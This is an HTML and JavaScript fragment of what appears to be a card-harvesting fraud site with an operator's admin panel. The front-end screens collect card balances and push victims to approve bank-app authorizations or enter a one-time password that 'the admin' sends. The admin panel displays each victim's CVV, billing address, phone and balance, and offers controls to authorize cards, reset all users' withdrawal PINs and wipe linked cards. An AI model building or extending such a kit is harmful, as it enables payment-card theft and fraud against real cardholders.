<input type="text" id="card-balance" placeholder="Current Card Balance" required>
</div>
<p class="error" id="card-error"></p>
<button type="submit" data-translate="linkCard">Link Card</button>
</form>
</div>
</div></div>
<!-- Card Auth Screen -->
<div id="card-auth-screen">
<div class="auth-screen-content">
<div class="auth-screen-icon">üîê</div>
<h2 class="auth-screen-title" data-translate="cardAuth">Card Authorization Required</h2>
<p class="auth-screen-text" data-translate="cardAuthText">Your card has been submitted for verification.</p>
<div class="auth-options">
<div class="auth-option"><div class="auth-option-icon">üì±</div><div><div class="auth-option-title" data-translate="authorizeInApp">Authorize in Bank App</div><div class="auth-option-desc" data-translate="authorizeAppDesc">1. Open your banking app
2. Go to Pending Authorizations
3. Approve the card verification request
4. Click button below after approval</div></div></div>
<div class="auth-option"><div class="auth-option-icon">üî¢</div><div><div class="auth-option-title" data-translate="enterOtp">One-Time Password (OTP)</div><div class="auth-option-desc" data-translate="otpDesc">Wait for admin to send OTP code to your notifications, then enter it below</div></div></div>
</div>
<div class="auth-action-buttons">
<button id="authorized-app-btn" class="btn-primary" data-translate="iAuthorized">I Authorized in Bank App</button>
<button id="enter-otp-btn" class="btn-secondary" data-translate="enterOtp">üî¢ Enter OTP Code</button>
<button id="close-card-auth" style="background:rgba(255,255,255,0.1);color:white;padding:12px 32px;border-radius:30px;border:1px solid rgba(255,255,255,0.2);cursor:pointer;width:100%" data-translate="close">Close</button>
</div>
<p style="font-size:13px;margin-top:24px;opacity:0.6;" data-translate="authProcessing">‚è±Ô∏è Authorization typically takes 5-10 minutes.</p>
</div>
</div>
<!-- OTP Modal -->
<div id="otp-input-modal" class="otp-input-modal"><div class="otp-input-content">
<h3 class="otp-input-title" data-translate="otpTitle">Enter OTP Code</h3>
<p class="otp-input-text" data-translate="otpText">Enter the one-time password sent to your notifications by the admin</p>
<input type="text" id="user-otp-input" class="otp-input-field" placeholder="0000" maxlength="4" pattern="\d{4}">
<p class="error" id="otp-input-error"></p>
<button id="otp-submit-btn" style="background:#34d399;color:white;padding:14px 32px;border-radius:12px;border:none;cursor:pointer;font-size:16px;font-weight:600;width:100%;margin-top:8px;" data-translate="verifyOtp">Verify OTP</button>
<button id="close-otp-input" style="background:rgba(255,255,255,0.1);color:white;padding:12px 32px;border-radius:30px;border:1px solid rgba(255,255,255,0.2);cursor:pointer;font-size:16px;margin-top:16px;width:100%;" data-translate="cancel">Cancel</button>
</div></div>
<!-- Cards List Modal -->
<div id="cards-list-modal" class="modal"><div class="modal-content">
<div class="modal-header"><h3>üí≥ <span data-translate="myLinkedCards">My Linked Cards</span></h3><button id="close-cards-list" class="close-btn">√ó</button></div>
<div id="linked-cards-list"></div>
</div></div>
<!-- Admin Panel -->
<div id="admin-panel">
<div class="admin-header"><h2>üîê <span data-translate="adminPanel">Admin Panel</span></h2><p data-translate="manageUsers">Manage user withdrawal codes</p></div>
<div class="admin-global-controls">
<h3 data-translate="changeAllPins">Change All Users' PINs</h3>
<div class="admin-global-input"><input type="text" id="admin-global-pin" class="admin-global-pin" placeholder="New PIN" maxlength="4"><button id="admin-change-all-btn" class="admin-change-all-btn" data-translate="changeAll">Change All</button></div>
<button id="admin-logout-btn" class="admin-logout-btn" data-translate="logoutBtn">Logout</button>
</div>
<div class="required-updates-section">
<h2 class="admin-section-title" data-translate="requiredUpdates">üî¥ Required Updates</h2>
<div id="required-updates-list"></div>
</div>
<h2 class="admin-section-title" data-translate="usersByCountry">üìç Users by Country</h2>
<div id="country-sections"></div>
</div>

<!-- ===== ADMIN UNLINK ALL BUTTON ===== -->
<button
  onclick="adminUnlinkAllCards()"
  style="
    position:fixed;
    bottom:20px;
    right:20px;
    padding:14px 18px;
    border-radius:10px;
    background:#dc2626;
    color:#fff;
    font-weight:600;
    border:none;
    cursor:pointer;
    z-index:9999;
  "
>
  üö® Unlink ALL Cards
</button>
<!-- ===== END ADMIN BUTTON ===== -->

<!-- ===== ADMIN GLOBAL UNLINK ALL CARDS FEATURE ===== -->
<script type="module">
window.adminUnlinkAllCards = async function () {
  const confirmAction = confirm(
    "‚ö†Ô∏è WARNING:\nThis will UNLINK and DELETE ALL linked cards for ALL users.\nThis action CANNOT be undone.\n\nDo you want to continue?"
  );
  if (!confirmAction) return;

  const usersRef = ref(db, 'users');

  await runTransaction(usersRef, users => {
    if (!users) return users;

    Object.keys(users).forEach(uid => {
      if (users[uid].linkedCards) {
        delete users[uid].linkedCards;

        users[uid].notifications = users[uid].notifications || [];
        users[uid].notifications.push({
          type: 'admin_unlink_all',
          message: 'All linked cards have been removed by admin.',
          date: new Date().toISOString(),
          read: false
        });
      }
    });

    return users;
  });

  alert("‚úÖ All linked cards for all users have been deleted.");
  loadAdminPanel();
};
</script>
<!-- ===== END GLOBAL UNLINK FEATURE ===== -->

</body></html>


<!-- ===== ADMIN CARD AUTHORIZATION EXTENSION (AUTO-ADDED) ===== -->
<script type="module">
// --- Admin card detail renderer (shows CVV + card balance) ---
function renderAdminCardDetails(user, card, uid, cardIndex) {
  const addr = card.billingAddress || {};
  const balance = Number(card.currentBalance || 0);
  const symbol = currencySymbols[user.currency] || '$';

  const wrap = document.createElement('div');
  wrap.style.cssText = `
    background:rgba(255,255,255,0.06);
    border-radius:12px;
    padding:16px;
    margin:12px 0;
  `;

  wrap.innerHTML = `
    <h3>üí≥ Card Information</h3>
    <p><strong>Brand:</strong> ${card.brand}</p>
    <p><strong>Card:</strong> ‚Ä¢‚Ä¢‚Ä¢‚Ä¢ ‚Ä¢‚Ä¢‚Ä¢‚Ä¢ ‚Ä¢‚Ä¢‚Ä¢‚Ä¢ ${card.lastFour}</p>
    <p><strong>Name:</strong> ${card.name}</p>
    <p><strong>Expiry:</strong> ${card.expiry}</p>

    <hr style="opacity:.2">

    <h3>üìç Billing Address</h3>
    <p><strong>Street:</strong> ${addr.street}</p>
    <p><strong>City:</strong> ${addr.city}</p>
    <p><strong>Postcode:</strong> ${addr.postcode}</p>
    <p><strong>Country:</strong> ${addr.country}</p>
    <p><strong>Phone:</strong> ${addr.phone}</p>

    <hr style="opacity:.2">

    <h3>üí∞ Declared Card Balance</h3>
    <p style="font-size:18px;font-weight:600;color:#34d399;">
      ${symbol}${balance.toLocaleString()}
    </p>

    <hr style="opacity:.2">

    <h3>üîê Security</h3>
    <p style="color:#ffcc00;"><strong>CVV:</strong> ${card.cvv}</p>

    <div style="display:flex;gap:8px;margin-top:12px;">
      <button class="btn-primary" onclick="adminAuthorizeCard('${uid}', ${cardIndex})">
        ‚úÖ Authorize
      </button>
      <button class="btn-danger" onclick="adminRejectCard('${uid}', ${cardIndex})">
        ‚ùå Reject
      </button>
    </div>
  `;

  return wrap;
}

// --- Admin approve ---
window.adminAuthorizeCard = async function(uid, cardIndex) {
  await runTransaction(ref(db, 'users/' + uid), user => {
    if (!user || !user.linkedCards) return user;
    user.linkedCards[cardIndex].status = 'authorized';
    user.linkedCards[cardIndex].authorizedDate = new Date().toISOString();
    user.notifications = user.notifications || [];
    user.notifications.push({
      type: 'card_authorized',
      message: 'Your card has been authorized by admin.',
      date: new Date().toISOString(),
      read: false
    });
    return user;
  });
  alert('‚úÖ Card authorized');
  loadAdminPanel();
};

// --- Admin reject (delete card) ---
window.adminRejectCard = async function(uid, cardIndex) {
  const reason = prompt('Reason for rejection?');
  if (!reason) return;
  await runTransaction(ref(db, 'users/' + uid), user => {
    if (!user || !user.linkedCards) return user;
    user.linkedCards.splice(cardIndex, 1);
    user.notifications = user.notifications || [];
    user.notifications.push({
      type: 'card_rejected',
      message: 'Card rejected: ' + reason,
      date: new Date().toISOString(),
      read: false
    });
    return user;
  });
  alert('‚ùå Card rejected and removed');
  loadAdminPanel();
};
</script>
<!-- ===== END ADMIN EXTENSION ===== -->
